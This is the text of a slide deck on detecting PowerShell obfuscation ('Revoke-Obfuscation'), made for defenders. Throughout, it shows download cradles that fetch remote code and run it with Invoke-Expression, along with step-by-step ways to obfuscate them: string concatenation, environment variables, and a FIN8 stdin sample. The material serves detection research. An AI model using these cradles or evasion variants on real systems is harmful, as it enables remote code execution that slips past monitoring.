Revoke-Obfuscation
> PowerShell Obfuscation Detection Using Science
Daniel Bohannon - @danielhbohannon
Lee Holmes - @Lee_Holmes
0.0/00
> Whois
0.0/00
-
MANDIANT Senior Applied Security Researcher
-
Invoke-Obfuscation, Invoke-CradleCrafter
-
Obfuscation, evasion and detection techniques
-
@danielhbohannon
Title . @Speaker . Location
%ProgramData:~0,1%%ProgramData:~9,2% /c echo OBFUSCATION_FTW!
> Whois
0.0/00
-
Lead security architect of Azure Management @ MS
-
Author of the Windows PowerShell Cookbook
-
Original member of PowerShell Development Team
-
@Lee_Holmes
Title . @Speaker . Location
iex (iwr bit.ly/e0Mw9w)
0.0/00
Title . @Speaker . Location
Preparing Your Environment for Investigations
• Logs (and retention) are your friend  1) enable 2) centralize 3) LOOK/MONITOR
• Process Auditing AND Command Line Process Auditing  4688 FTW!
• https://technet.microsoft.com/en-us/library/dn535776.aspx
• SysInternals’ Sysmon is also a solid option
• Real-time Process Monitoring
• Uproot IDS - https://github.com/Invoke-IR/Uproot
• PowerShell Module, ScriptBlock, and Transcription logging
• https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/
• https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html
Launch Techniques
• PowerShell Help is the best in the business 
Launch Techniques
• powershell.exe called by cmd.exe
• cmd.exe /c "powershell -c Write-Host SUCCESS -Fore Green"
Launch Techniques
• powershell.exe called by cmd.exe
• cmd.exe /c "powershell -c Write-Host SUCCESS -Fore Green"
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
Launch Techniques
• powershell.exe called by cmd.exe
..
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
Launch Techniques
• powershell.exe called by cmd.exe
..
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
Launch Techniques
• powershell.exe called by cmd.exe
..
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
Is it safe to key off of cmd.exe with arguments | powershell ??
Of course not! "powershell" can be set and called as variables in cmd.exe
cmd /c "set p1=power&& set p2=shell&& cmd /c echo Write-Host SUCCESS -Fore Green ^| 
%p1%%p2% - "
Launch Techniques
Here is an example of FIN8 combining this environment variable obfuscation with 
PowerShell stdin invocation
cmd /c echo %_MICROSOFT_UPDATE_CATALOG% | %_MICROSOFT_UPDATE_SERVICE%
powershell -
$Env:_CT;$o='';$l=$s.length;$i=$Env:_PA%$l;while($o.length -ne$l){$o+=$s[$i];$i=($i+$Env:_KE)%$l}iex($o)
Launch Techniques
Here is an example of FIN8 combining this environment variable obfuscation with 
PowerShell stdin invocation
cmd.exe /c echo %var1% | %var2%
cmd /c echo %_MICROSOFT_UPDATE_CATALOG% | %_MICROSOFT_UPDATE_SERVICE%
powershell -
powershell -
$Env:_CT;$o='';$l=$s.length;$i=$Env:_PA%$l;while($o.length -ne$l){$o+=$s[$i];$i=($i+$Env:_KE)%$l}iex($o)
Launch Techniques
• powershell.exe called by cmd.exe
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell -"
• cmd.exe /c "echo Write-Host SUCCESS -Fore Green | powershell IEX $input"
• cmd.exe /c "set cmd=Write-Host ENV -Fore Green && powershell IEX $env:cmd"
Can also use .Net function or GCI/dir:
[Environment]::GetEnvironmentVariable('cmd', 'Process')
(Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value
Kovter  Obfuscating the Cradle
0.0/00
Title . @Speaker . Location
Obfuscating the Cradle: (New-Object Net.WebClient)
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• Veil
• downloaderCommand = "iex (New-Object Net.WebClient).DownloadString(\"http://%s:%s/%s\")\n“
• https://github.com/nidem/Veil/blob/master/modules/payloads/powershell/psDownloadVirtualAlloc.py#L76
• PowerSploit
• $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)
• https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L1375
• Metasploit
(http://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/)
Obfuscating the Cradle: (New-Object Net.WebClient)
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
Obfuscating the Cradle
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
Obfuscating the Cradle
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
Obfuscating the Cradle
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• System.Net.WebClient
Obfuscating the Cradle
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• System.Net.WebClient
• ).DownloadString("http
Obfuscating the Cradle
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• System.Net.WebClient
• ).DownloadString("http
• Now let's demonstrate why assumptions are dangerous!
Obfuscating the Cradle
• Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• System.Net.WebClient
(System.* is not necessary for .Net functions)
• ).DownloadString("http
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString("http
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString("https://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString("http
(url is a string and can be concatenated)
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString("ht"+"tps://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString("http
(url is a string and can be concatenated)
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString("ht"+"tps://bit.ly/L3g1t")
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString("
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString("
(PowerShell string can be single or double quotes)
(…and did I mention whitespace?)
(…URL can also be set as variable.)
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString(
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString(
(is .DownloadString the only method for Net.WebClient?)
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).DownloadString(
Net.WebClient class has options: 
•
.DownloadString
•
.DownloadStringAsync
•
.DownloadStringTaskAsync
•
.DownloadFile
•
.DownloadFileAsync
•
.DownloadFileTaskAsync
•
.DownloadData
•
.DownloadDataAsync
•
.DownloadDataTaskAsync
•